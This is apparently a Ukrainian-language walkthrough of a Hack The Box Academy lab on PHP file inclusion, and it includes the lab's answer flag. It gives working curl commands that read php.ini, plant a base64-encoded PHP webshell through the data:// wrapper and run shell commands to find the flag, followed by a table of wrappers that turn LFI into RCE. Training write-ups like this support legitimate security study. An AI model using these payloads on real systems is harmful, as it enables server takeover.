## LFI — PHP Wrappers: RCE через `data://`

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [PHP Wrappers](https://academy.hackthebox.com/app/module/23/section/253)
**Завдання:** Отримати RCE через PHP wrapper → прочитати flag у `/`
**Прапор:** `HTB{d!$46l3_r3m0t3_url_!nclud3}`

***

## Концепція

`data://` wrapper передає довільні дані напряму в `include()` як PHP-код. Потребує `allow_url_include = On` у `php.ini`. Ланцюг: перевірити налаштування → закодувати webshell у Base64 → передати через `data://` → виконати команди.

***

## Крок 1 — Перевірка `allow_url_include`

```bash
B64=$(curl -s "http://TARGET_IP:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/]{40,}[=]{0,2}' | tail -1)

echo "$B64" | base64 -d | grep allow_url_include
# allow_url_include = On  ← необхідна умова
```

> Якщо `Off` — `data://` не спрацює, треба шукати інший вектор (log poisoning, `/proc/self/environ`).

***

## Крок 2 — Кодуємо webshell у Base64

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

> `+` і `=` у Base64 потрібно URL-encode у запиті: `+` → `%2B`, `=` → `%3D`.

***

## Крок 3 — Верифікація RCE

```bash
curl -s "http://TARGET_IP:PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id" | grep uid
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## Крок 4 — Знайти прапор у `/`

```bash
# Список файлів у корені
curl -s "http://TARGET_IP:PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/" | grep -v "^$\|html\|<"
# 37809e2f8952f06139011994726d9ef1.txt  ← підозрілий файл
```

```bash
# Читаємо прапор
curl -s "http://TARGET_IP:PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt" | grep "HTB{"
# HTB{d!$46l3_r3m0t3_url_!nclud3}
```

***

## Механіка атаки

```
data://text/plain;base64,BASE64_WEBSHELL
         ↑                    ↑
   PHP wrapper          <?php system($_GET["cmd"]); ?>
         ↓
include() виконує як PHP-код
         ↓
&cmd=ls / → виконується як shell команда
```

***

## PHP Wrappers для LFI → RCE

| Wrapper | Умова | Призначення |
|---|---|---|
| `data://text/plain;base64,` | `allow_url_include=On` | Виконати довільний PHP |
| `php://input` | `allow_url_include=On` | PHP код у POST body |
| `php://filter/...base64-encode` | Завжди | Читати вихідний код PHP |
| `expect://cmd` | `expect` extension | RCE напряму |
| `zip://shell.jpg%23shell.php` | Upload + LFI | Виконати PHP з zip |

***

## Прапор

```
HTB{d!$46l3_r3m0t3_url_!nclud3}
```
